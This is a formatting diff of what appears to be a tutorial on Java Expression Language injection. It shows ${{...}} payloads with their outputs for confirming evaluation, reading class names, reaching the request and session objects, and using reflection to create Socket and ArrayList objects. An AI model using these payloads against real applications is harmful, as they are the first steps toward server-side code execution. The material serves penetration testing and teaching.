@@ -66,19 +66,19 @@ In above example, anything between expression delimiters {{ }} will be evaluated
 
 Once it is confirmed that anything between expression delimiters is evaluated from this point we can send payloads to start gathering more information.
 
-## Convert string to Uppercase:
-```
+**Convert string to Uppercase:**
+```EL
 Payload: ${{'abc'.toUpperCase()}}
 Output: ABC
 ```
 
-## Concatenate two strings.
+**Concatenate two strings:**
 ```
 Payload: ${{'abc'.concat('def')}} 
 Output: abcdef
 ```
 
-## Get the class name of string.
+**Get the class name of string:**
 ```
 Payload: ${{'a'.getClass()}} 
 
@@ -88,7 +88,7 @@ Output: java.lang.String
 
 There are some built in variables such as **{{ request }}**, **{{ session }}**,**{{ faceContex }}**
 
-## Get the class of request object
+**Get the class of request object:**
 ```
 Payload: ${{ request }}
 
@@ -96,7 +96,7 @@ Output: [org.apache.catalina.connector.RequestFacade@316732da]
 ```
 
 
-## Get the class of session object
+**Get the class of session object:**
 ```
 Payload: ${{ session }}
 
@@ -104,7 +104,9 @@ Payload: ${{ session }}
 ```
 From this point we have some information regarding application we can start testing some functionality.
 
-Can we modify an object?
+
+
+**Can we modify an object?**
 ```
 Payload: ${{request.setAttribute(&quot;r&quot;,&quot;abc&quot;)}}  ${{request.getAttribute(&quot;r&quot;)}}
 
@@ -119,6 +121,8 @@ Using string &#39;a&#39; to get an instance of class Java.net.Socket -
 Payload: ${{&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.net.Socket&quot;).newInstance()}}
 Output: [a, Socket[unconnected]]
 ```
+
+
 An example payload to create array object using  forName() newInstance() Methods.
 ```
 ${request.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.util.ArrayList&quot;).newInstance())}
